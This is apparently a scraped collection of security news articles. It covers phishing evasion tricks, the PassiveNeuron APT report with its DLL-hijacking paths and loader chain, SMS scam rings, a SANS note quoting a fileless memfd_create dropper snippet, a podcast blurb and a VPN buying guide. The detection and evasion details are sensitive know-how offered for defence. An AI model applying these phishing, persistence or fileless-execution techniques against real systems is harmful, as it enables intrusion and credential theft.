while for the recipients it lends an air of legitimacy to attackers’ efforts and can be perceived as adherence to high security standards. Consequently, these emails tend to inspire more user trust.PDF file after the user enters the passwordPhishing and calendar alertsThe use of calendar events as a spam technique, which was popular in the late 2010s but gradually faded away after 2019, is a relatively old tactic. The concept is straightforward: attackers send an email that contains a calendar appointment. The body of the email may be empty, but a phishing link is concealed in the event description.Blank email with a phishing link in the calendar appointmentWhen the recipient opens the email, the event is added to their calendar – along with the link. If the user accepts the meeting without thoroughly reviewing it, they will later receive a reminder about it from the calendar application. As a result, they risk landing on the phishing website, even if they chose not to open the link directly in the original message.In 2025, phishers revived this old tactic. However, unlike the late 2010s, when these campaigns were primarily mass mailshots designed with Google Calendar in mind, they are now being used in B2B phishing and specifically target office workers.Phishing sign-in form for a Microsoft account from a calendar phishing attackVerifying existing accountsAttackers are not just updating the methods they use to deliver phishing content, but also the phishing websites. Often, even the most primitive-looking email campaigns distribute links to pages that utilize new techniques.Voice message phishingFor example, we observed a minimalistic email campaign crafted to look like an alert about a voice message left for the user. The body of the email contained only a couple of sentences, often with a space in the word “voice”, and a link. The link led to a simple landing page that invited the recipient to listen to the message.Landing page that opens when clicking the link in the phishing emailHowever, if the user clicks the button, the path does not lead to a single page but rather a chain of verification pages that employ CAPTCHA. The purpose is likely to evade detection by security bots.The CAPTCHA verification chainAfter repeatedly proving they are not a bot, the user finally lands on a website designed to mimic a Google sign-in form.The phishing sign-in formThis page is notable for validating the Gmail address the user enters and displaying an error if it is not a registered email.Error messageIf the victim enters a valid address, then, regardless whether the password is correct or not, the phishing site will display another similar page, with a message indicating that the password is invalid. In both scenarios, clicking “Reset Session” opens the email input form again. If a distracted user attempts to log in by trying different accounts and passwords, all of these end up in the hands of the attackers.MFA evasionBecause many users protect their accounts with multi-factor authentication, scammers try to come up with ways to steal not just passwords but alsoone-time codesandother verification data. Email phishing campaigns that redirect users to sites designed to bypass MFA can vary significantly in sophistication. Some campaigns employ primitive tactics, while others use well-crafted messages that are initially difficult to distinguish from legitimate ones. Let’s look at an email that falls in the latter category.Phishing email that mimics a pCloud notificationUnlike most phishing emails that try to immediately scare the user or otherwise grab their attention, the subject here is quite neutral: a support ticket update from the secure cloud storage provider pCloud that asks the user to evaluate the quality of the service. No threats or urgent calls to action. If the user attempts to follow the link, they are taken to a phishing sign-in form visually identical to the original, but with one key difference: instead of pcloud.com, the attackers use a different top-level domain, p-cloud.online.The phishing sign-in formAt every step of the user’s interaction with the form on the malicious site, the site communicates with the real pCloud service via an API. Therefore, if a user enters an address that is not registered with the service, they will see an error, as if they were signing in to pcloud.com. If a real address is entered, a one-time password (OTP) input form opens, which pCloud also requests when a user tries to sign in.OTP input formSince the phishing site relays all entered data to the real service, an attempt to trick the verification process will fail: if a random combination is entered, the site will respond with an error.Attempting to bypass verificationThe real OTP is sent by the pCloud service to the email address the user provided on the phishing site.OTP emailOnce the user has “verified” the account, they land on the password input form; this is also requested by the real service. After this step, the phishing page opens a copy of the pCloud website, and the attacker gains access to the victim’s account. We have to give credit to the scammers: this is a high-quality copy. It even includes a default folder with a default image identical to the original, which may delay the user’s realization that they have been tricked.Password input formConclusionThreat actors are increasingly employing diverse evasion techniques in their phishing campaigns and websites. In email, these techniques include PDF documents containing QR codes, which are not as easily detected as standard hyperlinks. Another measure is password protection of attachments. In some instances, the password arrives in a separate email, adding another layer of difficulty to automated analysis. Attackers are protecting their web pages with CAPTCHAs, and they may even use more than one verification page. Concurrently, the credential-harvesting schemes themselves are becoming more sophisticated and convincing.To avoid falling victim to phishers, users must stay sharp:Treat unusual attachments, such as password-protected PDFs or documents using a QR code instead of a link to a corporate website, with suspicion.Before entering credentials on any web page, verify that the URL matches the address of the legitimate online service.Organizations are advised to conduct regularsecurity trainingfor employees to keep them up-to-date on the latest techniques being used by threat actors. We also recommend implementing a reliable solution for email server security. For example,Kaspersky Security for Mail Serverdetects and blocks all the attack methods described in this article.",
      "summary": "Email phishing attacks have evolved significantly since their inception, with threat actors continually refining and repurposing established tactics to bypass security measures and evade detection. In 2025, the landscape of email phishing has seen a resurgence in techniques such as using PDF attachments with QR codes or passwords for added legitimacy. Additionally, attackers are revisiting old tactics like calendar alerts and voice message phishing, which were popular but eventually faded from use. Modern phishing campaigns also incorporate CAPTCHA evasion strategies to protect their malicious websites, making it challenging for users to distinguish between legitimate and phishing sites. The sophistication of these attacks highlights the need for continuous security training and heightened user vigilance to prevent falling victim to such threats.",

      "url": "https://securelist.com/passiveneuron-campaign-with-apt-implants-and-cobalt-strike/117745/",
      "published_date": "2025-10-21",
      "content": "IntroductionBack in 2024, wegave a brief descriptionof a complex cyberespionage campaign that we dubbed “PassiveNeuron”. This campaign involved compromising the servers of government organizations with previously unknown APT implants, named “Neursite” and “NeuralExecutor”. However, since its discovery, the PassiveNeuron campaign has been shrouded in mystery. For instance, it remained unclear how the implants in question were deployed or what actor was behind them.After we detected this campaign and prevented its spreading back in June 2024, we did not see any further malware deployments linked to PassiveNeuron for quite a long time, about six months. However, since December 2024, we have observed a new wave of infections related to PassiveNeuron, with the latest ones dating back to August 2025. These infections targeted government, financial and industrial organizations located in Asia, Africa, and Latin America. Since identifying these infections, we have been able to shed light on many previously unknown aspects of this campaign. Thus, we managed to discover details about the initial infection and gather clues on attribution.SQL servers under attackWhile investigating PassiveNeuron infections both in 2024 and 2025, we found that a vast majority of targeted machines were running Windows Server. Specifically, in one particular infection case, we observed attackers gain initial remote command execution capabilities on the compromised server through the Microsoft SQL software. While we do not have clear visibility into how attackers were able to abuse the SQL software, it is worth noting that SQL servers typically get compromised through:Exploitation of vulnerabilities in the server software itselfExploitation of SQL injection vulnerabilities present in the applications running on the serverGetting access to the database administration account (e.g. by brute-forcing the password) and using it toexecute malicious SQL queriesAfter obtaining the code execution capabilities with the help of the SQL software, attackers deployed an ASPX web shell for basic malicious command execution on the compromised machine. However, at this stage, things did not go as planned for the adversary. The Kaspersky solution installed on the machine was preventing the web shell deployment efforts, and the process of installing the web shell ended up being quite noisy.In attempts to evade detection of the web shell, attackers performed its installation in the following manner:They dropped a file containing the Base64-encoded web shell on the system.They dropped a PowerShell script responsible for Base64-decoding the web shell file.They launched the PowerShell script in an attempt to write the decoded web shell payload to the filesystem.As Kaspersky solutions were preventing the web shell installation, we observed attackers to repeat the steps above several times with minor adjustments, such as:Using hexadecimal encoding of the web shell instead of Base64Using a VBS script instead of a PowerShell script to perform decodingWriting the script contents in a line-by-line mannerHaving failed to deploy the web shell, attackers decided to use more advanced malicious implants to continue the compromise process.Malicious implantsOver the last two years, we have observed three implants used over the course of PassiveNeuron infections, which are:Neursite, a custom C++ modular backdoor used for cyberespionage activitiesNeuralExecutor, a custom .NET implant used for running additional .NET payloadsthe Cobalt Strike framework, a commercial tool for red teamingWhile we saw different combinations of these implants deployed on targeted machines, we observed that in the vast majority of cases, they were loaded through a chain of DLL loaders. The first-stage loader in the chain is a DLL file placed in the system directory. Some of these DLL file paths are:C:\\Windows\\System32\\wlbsctrl.dllC:\\Windows\\System32\\TSMSISrv.dllC:\\Windows\\System32\\oci.dllStoring DLLs under these paths has been beneficial to attackers, as placing libraries with these names inside the System32 folder makes it possible to automatically ensure persistence. If present on the file system, these DLLs get automatically loaded on startup (the first two DLLs are loaded into thesvchost.exeprocess, while the latter is loaded intomsdtc.exe) due to the employedPhantom DLL Hijacking technique.It also should be noted that these DLLs are more than 100 MB in size — their size is artificially inflated by attackers by adding junk overlay bytes. Usually, this is done to make malicious implants more difficult to detect by security solutions.On startup, the first-stage DLLs iterate through a list of installed network adapters, calculating a 32-bit hash of each adapter’s MAC address. If neither of the MAC addresses is equal to the value specified in the loader configuration, the loader exits. This MAC address check is designed to ensure that the DLLs get solely launched on the intended victim machine, in order to hinder execution in a sandbox environment. Such detailed narrowing down of victims implies the adversary’s interest towards specific organizations and once again underscores the targeted nature of this threat.Having checked that it is operating on a target machine, the loader continues execution by loading a second-stage loader DLL that is stored on disk. The paths where the second-stage DLLs were stored as well as their names (examples includeelscorewmyc.dllandwellgwlserejzuai.dll) differed between machines. We observed the second-stage DLLs to also have an artificially inflated file size (in excess of 60 MB), and the malicious goal was to open a text file containing a Base64-encoded and AES-encrypted third-stage loader, and subsequently launch it.Snippet of the payload file contentsThis payload is a DLL as well, responsible for launching a fourth-stage shellcode loader inside another process (e.g.WmiPrvSE.exeormsiexec.exe) which is created in suspended mode. In turn, this shellcode loads the final payload: a PE file converted to a custom executable format.In summary, the process of loading the final payload can be represented with the following graph:Final payload loadingIt is also notable that attackers attempted to use slightly different variants of the loading scheme for some of the target organizations. For example, we have seen cases without payload injection into another process, or with DLL obfuscation on disk with VMProtect.The Neursite backdoorAmong the three final payload implants that we mentioned above, the Neursite backdoor is the most potent one. We dubbed it so because we observed the following source code path inside the discovered samples: E:\\pro\\code\\Neursite\\client_server\\nonspec\\mbedtls\\library\\ssl_srv.c. The configuration of this implant contains the following parameters:List of C2 servers and their portsList of HTTP proxies that can be used to connect to C2 serversList of HTTP headers used while connecting to HTTP-based C2 serversA relative URL used while communicating with HTTP-based C2 serversA range of wait time between two consecutive C2 server connectionsA byte array of hours and days of the week when the backdoor is operableAn optional port that should be opened for listening to incoming connectionsThe Neursite implant can use the TCP, SSL, HTTP and HTTPS protocols for C2 communications. As follows from the configuration, Neursite can connect to the C2 server directly or wait for another machine to start communicating through a specified port. In cases we observed, Neursite samples were configured to use either external servers or compromised internal infrastructure for C2 communications.The default range of commands implemented inside this backdoor allows attackers to:Retrieve system information.Manage running processes.Proxy traffic through other machines infected with the Neursite implant, in order to facilitate lateral movement.Additionally, this implant is equipped with a component that allows loading supplementary plugins. We observed attackers deploy plugins with the following capabilities:Shell command executionFile system managementTCP socket operationsThe NeuralExecutor loaderNeuralExecutor is another custom implant deployed over the course of the PassiveNeuron campaign. This implant is .NET based, and we found that it employed the open-source ConfuserEx obfuscator for protection against analysis. It implements multiple methods of network communication, namely TCP, HTTP/HTTPS, named pipes, and WebSockets. Upon establishing a communication channel with the C2 server, the backdoor can receive commands allowing it to load .NET assemblies. As such, the main capability of this backdoor is to receive additional .NET payloads from the network and execute them.Tricky attributionBoth Neursite and NeuralExecutor, the two custom implants we found to be used in the PassiveNeuron campaign, have never been observed in any previous cyberattacks. We had to look for clues that could hint at the threat actor behind PassiveNeuron.Back when we started investigating PassiveNeuron back in 2024, we spotted one such blatantly obvious clue:Function names found inside NeuralExecutorIn the code of the NeuralExecutor samples we observed in 2024, the names of all functions had been replaced with strings prefixed with “Супер обфускатор”, the Russian for “Super obfuscator”. It is important to note, however, that this string was deliberately introduced by the attackers while using the ConfuserEx obfuscator. When it comes to strings that are inserted into malware on purpose, they should be assessed carefully during attribution. That is because threat actors may insert strings in languages they do not speak, in order to create false flags intended to confuse researchers and incident responders and prompt them to make an error of judgement when trying to attribute the threat. For that reason, we attached little evidential weight to the presence of the “Супер обфускатор” string back in 2024.After examining the NeuralExecutor samples used in 2025, we found that the Russian-language string had disappeared. However, this year we noticed another peculiar clue related to this implant. While the 2024 samples were designed to retrieve the C2 server addresses straight from the configuration, the 2025 ones did so by usingthe Dead Drop Resolver technique. Specifically, the new NeuralExecutor samples that we found were designed to retrieve the contents of a file stored in a GitHub repository, and extract a string from it:Contents of the configuration file stored on GitHubThe malware locates this string by searching for two delimiters,wtyyvZQYandstU7BU0R, that mark the start and the end of the configuration data. The bytes of this string are then Base64-decoded and decrypted with AES to obtain the C2 server address.Snippet of the implant configurationIt is notable that this exact method of obtaining C2 server addresses from GitHub, using a string containing delimiter sequences, is quite popular among Chinese-speaking threat actors. For instance, we frequentlyobserved it being used in the EastWind campaign, which we previously connected to the APT31 and APT27 Chinese-speaking threat actors.Furthermore, during our investigation, we learned one more interesting fact that could be useful in attribution. We observed numerous attempts to deploy the PassiveNeuron loader in one particular organization. After discovering yet another failed deployment, we have detected a malicious DLL namedimjp14k.dll. An analysis of this DLL revealed that it had the PDB path G:\\Bee\\Tree(pmrc)\\Src\\Dll_3F_imjp14k\\Release\\Dll.pdb. This PDB string was referenced in areport by Cisco Taloson activities likely associated with the threat actor APT41. Moreover, we identified that the discovered DLL exhibits the same malicious behavior as described in the Cisco Talos report. However, it remains unclear why this DLL was uploaded to the target machine. Possible explanations could be that the attackers deployed it as a replacement for the PassiveNeuron-related implants, or that it was used by another actor who compromised the organization simultaneously with the attackers behind PassiveNeuron.When dealing with attribution of cyberattacks that are known to involve false flags, it is difficult to understand which attribution indicators to trust, or whether to trust any at all. However, the overall TTPs of the PassiveNeuron campaign most resemble the ones commonly employed by Chinese-speaking threat actors. Since TTPs are usually harder to fake than indicators like strings, we are, as of now, attributing the PassiveNeuron campaign to a Chinese-speaking threat actor, albeit with a low level of confidence.ConclusionThe PassiveNeuron campaign has been distinctive in the way that it primarily targets server machines. These servers, especially the ones exposed to the internet, are usually lucrative targets for APTs, as they can serve as entry points into target organizations. It is thus crucial to pay close attention to theprotection of server machines. Wherever possible, the attack surface associated with these servers should be reduced to a minimum, and all server applications should be monitored to prevent emerging infections in a timely manner. Specific attention should be paid to protecting applications against SQL injections, which are commonly exploited by threat actors to obtain initial access. Another thing to focus on is protection against web shells, which are deployed to facilitate compromise of servers.Indicators of compromisePassiveNeuron-related loader files12ec42446db8039e2a2d8c22d7fd2946406db41215f7d333db2f2c9d60c3958b44a64331ec1c937a8385dfeeee6678fd8dcf258f66fa0cec1e4a800fa1f6c2a2d587724ade76218aa58c78523f6fa14ef806083c919e49aca3f301d082815b30Malicious imjp14k.dll DLL751f47a688ae075bba11cf0235f4f6ee",
      "summary": "The PassiveNeuron campaign, identified as a sophisticated cyberespionage effort targeting servers of high-profile organizations, has been active since 2024. The campaign primarily utilizes two malware implants, Neursite and NeuralExecutor, both custom developments for espionage purposes. These implants are notable for their modular design and the use of DLL hijacking techniques to persist on compromised machines. Key findings include the discovery that a majority of targeted servers ran Windows Server, with attackers exploiting Microsoft SQL software for initial access. Subsequent stages involved deploying an ASPX web shell and escalating to more advanced implants through a chain of DLL loaders. The Neursite backdoor stands out for its potent capabilities including retrieving system information, managing processes, and proxy traffic, highlighting the campaign's intent on gathering intelligence from specific organizations.\n\nThe impact of PassiveNeuron extends beyond mere data theft; it poses significant risks to national security and economic stability by compromising critical infrastructure and sensitive government information. The business implications are profound, urging immediate attention from all stakeholders to implement robust cybersecurity measures to prevent such attacks.",

But where are all these scam texts coming from?According to anarticle in The Wall Street Journal:“It has become a billion-dollar, highly sophisticated business benefiting criminals in China.”In particular, the number oftoll payment scammessages has exploded, rising by 350% since January 2024—allegedly, a record 330,000 such messages were reported in a single day. But we’ve also highlighted recent SMS-based scams aroundNew York’s inflation refund programand texts froma fake Bureau of Motor Vehiclestrying to steal your banking details.Toll, postage, and refund scams might look different on the surface, but they all feed the same machine, each one crafted to look like an urgent government or service message demanding a small fee. Together, they make up an industrialized text scam ecosystem that’s earned Chinese crime groups more than $1 billion in just three years.In a bid to tackle the problem,Project Red Hookcombines the power of the US Homeland Security Investigations (HSI) with law enforcement partners and businesses to raise awareness of how Chinese organized crime groups are exploiting gift cards to launder money.The texts are sent out in bulk from so-called SIM farms, a setup where many mobile SIM cards are placed into a rack or special device, instead of inside phones. This device connects to a computer and lets someone send thousands of text messages (or make calls) automatically and all at once. It’s reported that the SIM farms are mostly located in the US, and set up by workers who have no idea they are assisting a fraud ring.The main goal of these scams is to steal credit card information, which is then used at the victim’s expense in a vast criminal network.Criminals bypass multi-factor authentication (MFA, or 2FA) by adding stolen cards to mobile wallets, knowing that banks often trust the device after its first use and don’t ask for further checks. They install stolen card numbers onto Google Pay and Apple Wallets in Asia and share access to those cards with people in the US. Gig workers andmoney mulesthen use the stolen card details to buy high-value goods such as iPhones, clothes, and especially gift cards. They ship these goods to China, where criminal rings sell them and funnel the profits back into their operations.The criminals find the people willing to make purchases through Telegram channels. On any given day, scammers employ 400 to 500 of these mules. They are paid around 12 cents for every $100 gift card they buy, according to an assistant special agent in charge at HSI.So, with the aid of SIM farms and money mules in the US, Chinese gangs have turned text message scams into an industrial-scale operation targeting Americans. They use tech tricks and international collaboration to make over a billion dollars—much of it via toll and shipping payment scams—and launder the proceeds through digital wallets and gift cards.Security tipsThe best way to stay safe is to make sure you’re aware of the latest scam tactics. Since you’re reading our blog, you’re off to a good start.Never reply to or follow linksin unsolicited tax refund texts, calls, or emails, even if they look urgent.Never shareyour Social Security number or banking details with anyone claiming to process your tax refund.Go direct.If in doubt, contact the company through official channels.Use an up-to-date real-timeanti-malware solution, preferably with a web protection component.Pro tip:Did you know that you can submit suspicious messages like these to MalwarebytesScam Guard, which instantly flags known scams?We don’t just report on scams—we help detect themCybersecurity risks should never spread beyond a headline.

      "content": "I found another piece of malware this weekend. This one looks more like a proof-of-concept because the second-stage payload is really \"simple\", but it attracted my attention because it uses a nice technique to obfuscate the code.The dropper is a simple Python script (SHA256:e6f7afb92153561ff6c584fee1b04fb132ba984e8a28ca63708a88ebad15b939) with a low VT score of 4/62[1]. The script contains an embedded Base64 payload that, once decoded, will be executed. This second stage is an ELF file, indicating the script targets a Linux system.What attracted my attention is the direct use of syscall()[2] instead of classic functions:import ctypes\nlibc = ctypes.CDLL(None)\nsyscall = libc.syscall\n[...]\nfd = syscall(319, \"\", 1)\nos.write(fd, content)A full list of available syscalls is documented by many websites[3]. The syscall 319 is \"memfd_create\" and, as the name suggests, it allows creating a file descriptor in memory (read: without touching the filesystem).The Base64 payload is not very interesting, it's an ELF file (SHA256:52fc723f7e0c4202c97ac5bc2add2d1d3daa5c3f84f3d459a6a005a3ae380119) that will just encrypt files using a 1-byte XOR key:[1]https://www.virustotal.com/gui/file/e6f7afb92153561ff6c584fee1b04fb132ba984e8a28ca63708a88ebad15b939/detection[2]https://man7.org/linux/man-pages/man2/syscalls.2.html[3]https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls/Xavier Mertens (@xme)XamecoSenior ISC Handler - Freelance Cyber Security ConsultantPGP Key(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.",
      "summary": "This analysis highlights a new malware strain targeting Linux systems, utilizing a proof-of-concept approach with obfuscation techniques to evade detection. The malware is delivered via a Python script that embeds Base64 encoded payloads and directly invokes syscall() functions instead of using traditional library calls. Specifically, it employs the 'memfd_create' syscall (syscall 319) to create a file descriptor in memory without writing to disk, which suggests an intent to avoid immediate filesystem impact that might trigger security alerts. The malware payload is an ELF file designed to encrypt files using a simple XOR cipher with a single byte key. This technique, while not sophisticated, demonstrates the potential for evasion and could be part of a broader trend in cyber threats leveraging low-signature or obfuscated techniques.\n\nThe impact on businesses running Linux systems includes increased risk due to the stealthy nature of this malware, capable of executing without leaving obvious traces that might prompt immediate IT response. The use of syscall() for code execution is noteworthy as it challenges traditional security tools and practices focused on signature-based detection. Moreover, the simplicity of the encryption method (XOR with a single byte) suggests either initial testing or specific targeting scenarios where minimal data disruption could be preferred.\n\nBusiness implications include heightened awareness of potential threats to Linux environments, necessitating updated threat intelligence gathering and more robust security protocols that can detect and respond to such obfuscated malware. Organizations should also consider enhancing their endpoint detection and response capabilities to better handle fileless or low-signature attacks.",

It has a search engine that handles billions of requests a day. Its tracking and metrics service, Google Analytics, is embedded into reportedly 10s of millions of websites. Its Maps feature not only serves up directions around the world, it also tracks traffic patterns across countless streets, highways, and more. Its online services for email (Gmail), cloud storage (Google Drive), and office software (Google Docs, Sheets, and Slides) are household names. And it also runs the most popular web browser in the world, Google Chrome, and the most popular operating system in the world, Android.Today, on the Lock and Code podcast, Ruiz explains how he requested his data from Google and what he learned not only about the company, but about himself, in the process. That includes the 142,729 items in his Gmail inbox right now, along with the 8,079 searches he made, 3,050 related websites he visited, and 4,610YouTube videoshe watched in just the past 18 months. It also includes his late-night searches for worrying medical symptoms, his movements across the US as his IP address was recorded when logging into Google Maps, his emails, his photos, his notes, his old freelance work as a journalist, his outdated cover letters when he was unemployed, his teenage-year Google Chrome bookmarks, his flight and hotel searches, and even the searches he madewithinhis own Gmail inbox and his Google Drive.After digging into the data for long enough, Ruiz came to a frightening conclusion: Google knows whatever the hell it wants about him, it just has to look.But Ruiz wasn’t happy to let the company’s access continue. So he has a plan.”I am taking steps to change that [access] so that the next time I ask, “What does Google know about me?” I can hopefully answer: A little bit less.”Tune in today to listen to the full episode.Show notes and credits:Intro Music: “Spellbound” by Kevin MacLeod (incompetech.com)Licensed under Creative Commons: By Attribution 4.0 Licensehttp://creativecommons.org/licenses/by/4.0/Outro Music: “Good God” by Wowa (unminus.com)Listen up—Malwarebytes doesn’t just talk cybersecurity, we provide it.Protect yourself from online attacks that threaten your identity, your files, your system, and your financial well-being with ourexclusive offer for Malwarebytes Premium Security for Lock and Code listeners.",

They all want you to believe they're the best VPN you can buy. All of them say they have the biggest network, or claim they have a no-logging policy. And they all promise your internet traffic is safe on the network of servers they've rented. Only some of them are telling the truth.\nVPNs are only growing in popularity due to\nage-verification laws in the UK\nand in several\nstates in the US\n. Even if you don't\nwant\na VPN,\nyou might need one\n. If you're hesitant, I get it. VPN providers have been deep in murky waters for years, constantly caught lying about their practices,\nhanding over user data\nthat was never supposed to be logged, and serving as safe\nhavens for large cybercriminal organizations\n.\nI wanted to find the VPN services that actually work; the ones that keep their promises even in the face of potential prosecution, and the ones that have a proven track record of reliable performance. Some of the picks in this guide aren't conventional, and some of the services I suggest you avoid might be controversial. But these are the top VPNs I'd use day-to-day.\nRead our other VPN guides, including\nhow to set up a VPN on your router\nand\nhow to use a VPN to watch Netflix when you travel abroad\n.\nUpdate October 2025: We’ve added ExpressVPN as a top pick and EventVPN to other VPNs we’ve tested. We’ve added X-VPN and Hola to VPNs you should avoid.\nHow Much Do VPNs Cost?\nAccordionItemContainerButton\nLargeChevron\nThere's a broad range of prices for VPN services, but most providers sit somewhere around $10 per month for a monthly plan. That number changes if you purchase several months at once, and it's even more obfuscated with full security suites, such as those offered by Nord Security and Proton.\nMost of the prominent VPN services you'll come across offer multi-month, or even multi-year, discounts. These plans are often the best way to get your foot in the door, but recently, some\nVPNs have faced class-action lawsuits\nin regards to their auto-renewal practices. Although a handful of lawsuits have been filed, that doesn't mean these services necessarily engaged in illegal practices.\nFree VPNs exist, as well, but\nyou should avoid most of them\n. Some restrictive free plans from Proton and Windscribe are useful, but you should handle most free VPNs with skepticism.\nWhat Does a VPN Do? And How Does It Work?\nAccordionItemContainerButton\nLargeChevron\nVPN stands for\nvirtual private network\n. A VPN provides a tunnel that all of your internet traffic passes through. Instead of connecting to the servers of your internet service provider, you connect to a server in the VPN's network before connecting to the broader internet. Due to how most VPNs services operate, your browsing data isn't stored, essentially making you anonymous online.\nThe linchpin in this system is a VPN protocol. Today, nearly all internet traffic is encrypted, but that encryption only happens once you've established a connection with a website. A VPN protocol encrypts traffic before it heads off to the VPN server, which adds some extra security on untrusted networks like public Wi-Fi at a coffee shop or airport. It doesn't help much on your personal network unless someone is intruding on it.\nAlthough VPNs are often marketed as security tools, they serve a\nbetter purpose for privacy\nand bypassing geo-restrictions. By anonymizing your traffic through a VPN server, your browsing can't be traced back to you. And, by routing your traffic through a server in another location, you can bypass geo-restrictions online, such as the content libraries available in different countries on Netflix.\nVPN Terms and Features, Explained\nAccordionItemContainerButton\nLargeChevron\nYou'll come across a few of these terms in this guide and as you generally shop for a VPN. Here's what they mean.\nDouble-hop:\nConnecting to two (or more) VPN servers in succession. This provides an extra layer of privacy if someone traces your network path, but it will vastly reduce speeds.\nSplit tunneling:\nAllows you to choose which apps use the VPN tunnel. Useful if you want some apps (like your browser) to use the VPN tunnel but not others.\nKill switch:\nA security feature in VPNs that will disable your internet connection if the VPN connection drops. A kill switch can avoid leaking internet traffic in the event of a VPN failure.\nIP and domain block list:\nA list of IP addresses or domain names that are blocked inside the VPN tunnel. Some VPNs offer Domain Name System (DNS) blocking, too, which can block ads served from particular DNS servers.\nStatic IP:\nMost VPNs assign you a random IP address, or even rotate the IP address while you’re connected. If you need external access to your network with a network-wide VPN, you'll need a static IP address.\nPort forwarding:\nAllows you to forward a port on your private network, bypassing the VPN tunnel. Useful for instances where you need external network access with a network-wide VPN, such as running a media server.\nNetShield:\nA feature specific to Proton VPN that blocks ads and trackers while connected to the VPN. Other services, such as Windscribe and NordVPN, offer similar features.\nDark web monitoring:\nA feature available in some VPNs, such as NordVPN and ProtonVPN, that will monitor the dark web for your email address or other personal information. You'll be notified if the information shows up on the dark web, or as part of a breach.\nDAITA:\nA feature of Mullvad VPN that will introduce background noise to your connection, combating AI-assisted network analysis. Windscribe, NordVPN, and ProtonVPN have similar features available.\nAre VPNs Illegal?\nAccordionItemContainerButton\nLargeChevron\nShort of a few exceptions, VPNs are legal around the world. That includes the US, UK, Canada, Australia, the EU, South Africa, and many countries in Central and South America. Countries such as North Korea and Turkmenistan have VPN bans in place, but due to the extreme censorship in those countries, it's hard to verify what laws are on the books (and how they're enforced). You can probably guess the North Korean government's stance on bypassing censorship, though.\nFor everyone else, the legality of VPNs only comes into play when it comes to what VPN you're using, and what you're using it for. Countries such as India and Russia call for compliance with the government, forcing providers like\nNordVPN to shut down servers\nin those regions. And, regardless of what country you're in, engaging in illegal activity while connected to a VPN is still illegal.\nBest VPN Overall\nPhotograph: Jacob Roach\nProton\nVPN Plus\n$72\nProton VPN (2 Year)\n$48\nProton VPN (Yearly)\nProton VPN (9/10, WIRED Recommends)\nis the best VPN you can buy. Its Plus service was the fastest I tested across the US and UK. It has a generous free plan if you'd like to try it out first. The features are unmatched, and the pricing is excellent, especially if you bundle Proton VPN with the company's other software (Proton Unlimited). After testing all of these services, Proton is what I personally use now.\nWhat sent Proton over the edge was its commitment to transparency. It has\nmaintained a transparency report\nsince 2017, undergone\nthird-party audits annually\nsince 2022, and\nopen-sourced its applications\nfive years ago. That last bit is huge, as bugs within the application can pose a security risk, and handing those applications over to the open source community can surface those bugs much faster. There are no real compromises here, with features like split tunneling, port forwarding, and double-hop connections.\nProton is a rare example of a VPN service that gets it. Every VPN engages in the same marketing practices, touting their security, speed, and privacy. But Proton puts its money where its mouth is, all while offering a remarkably easy-to-use and feature-rich VPN application.\nSpecs\nNumber of devices:\n10\nNumber of servers:\n15,000+\nApplications:\nWindows, macOS, Linux, ChromeOS, Android, iOS, Chrome, Firefox, Google TV, Apple TV, Fire TV\nFeatures:\nKill switch, split tunneling, NetShield ad blocker, port forwarding, double-hop, P2P servers\nBest VPN Upgrade\nScreenshot courtesy of Scott Gilberson via NordVPN\nNordVPN\nPlus\n$96\nNordVPN (2-Year)\n$72\nNordVPN (1-Year)\nNordVPN has a long history, and it's one of the most prominent VPN services on the market. It comes with one of the largest VPN networks available, enough features to make Surfshark blush, and decent (though not the best) speeds. It's a little more expensive than I'd hoped for, but that's the price you pay for such an extensive network and feature set.\nThat feature set is where NordVPN stands apart. Its Basic plan will get you access to the VPN, but I recommend going with at least the Plus plan. It opens up an ad blocker and gives you access to one of the\nbest password managers\naround, NordPass.\nLike Proton, Nord lets you scale up your protection with encrypted cloud storage, but Nord leans further into security while Proton focuses on privacy-focused productivity. With NordVPN, you can upgrade to unlock NordProtect, an identity theft protection service, as well as Incogni to remove your data online.\nThese extras wouldn't mean much on their own, but the core of NordVPN is still an excellent VPN service. It's been on the bleeding-edge of VPN security and features for years, and that hasn't changed.\nSpecs\nNumber of devices:\n10\nNumber of servers:\n7,400+\nApplications:\nWindows, macOS, Linux, iOS, Android, Chrome, Firefox, Edge, Google TV, Apple TV\nFeatures:\nKill switch, split tunneling, double-hop, dark web monitoring, P2P servers\nBest Free VPN\nPhotograph: Jacob Roach\nWindscribe\nVPN\nShop at\nWindscribe (Free)\n$69\nWindscribe (Pro, Yearly)\nYou should generally avoid\nfree VPNs\n, but Windscribe's VPN service is one of the few worth considering. You get 10 GB of data across 10 server locations and unlimited connections, and you can even unlock more data if you refer friends or post on social media about Windscribe. There are a few similar offers from services like Proton, but Windscribe provides a pleasant on-ramp for subscribing.\nYou can build your own plan. Unlimited data runs an extra $3 per month, and you can add server locations for an extra $1 per server per month. It's fantastic. Most people don't need VPN servers in Ghana, Cambodia, and Peru, so rather than charge for all those locations, you can pick out your locations piecemeal. If you want everything, that's available at a discounted rate too.\nThe pricing model is what sets Windscribe apart, but it's an excellent VPN in its own right. It offers additional packet obfuscation to combat network analysis, and it's loaded with features like split tunneling and port forwarding. It's fast, too, dropping just 15.6 percent of my speed when connected in the US. Like the other providers I've included, Windscribe has undergone a third-party audit. But unlike the other options, it's also been taken to court. Windscribe CEO Yegor Sak was personally charged with a crime in Greece in relation to a user's activity on Windscribe-operated servers, essentially tying activity on the network to Sak personally. It was dismissed. VPNs are subpoenaed all the time, but the fact that Windscribe wasn't able to produce logs even when the CEO of the company was facing criminal prosecution speaks volumes.\nSpecs\nNumber of devices:\nUnlimited (for personal use)\nNumber of servers:\nUnknown (65+ locations)\nApplications:\nWindows, macOS, Linux, iOS, Android, Chrome\nFeatures:\nKill switch, split tunneling, port forwarding, IP and domain block list, P2P servers\nBest VPN for Beginners\nCourtesy of Surfshark\nSurfshark\nStarter VPN\n$48\nSurfshark (2-Year)\n$38\nSurfshark (1-Year)\nI've used Surfshark personally for a few years, and I'd still be using it if Proton didn't impress me so much. Surfshark is dead simple to use. It pops up and connects before swiftly getting out of my way so I can get on with my day. If you spring for a two-year plan, it's cheap. You can score over two years for around $50 with the Starter plan.\nIf you want to dig in deeper, you can. Surfshark is one of the most feature-rich VPNs I've used, sporting the basics like a double-hop connection and split tunneling, as well as an ad blocker and email masking. Like Proton, Surfshark offers other security tools like antivirus and dark web monitoring if you pick up a more expensive plan.\nSurfshark loses out just a bit when it comes to privacy, however. It has a no-logs policy, and it maintains\na transparency report\nand a\nwarrant canary\n, so there's no reason to suspect Surfshark is doing anything underhanded. But it doesn't have open source applications, 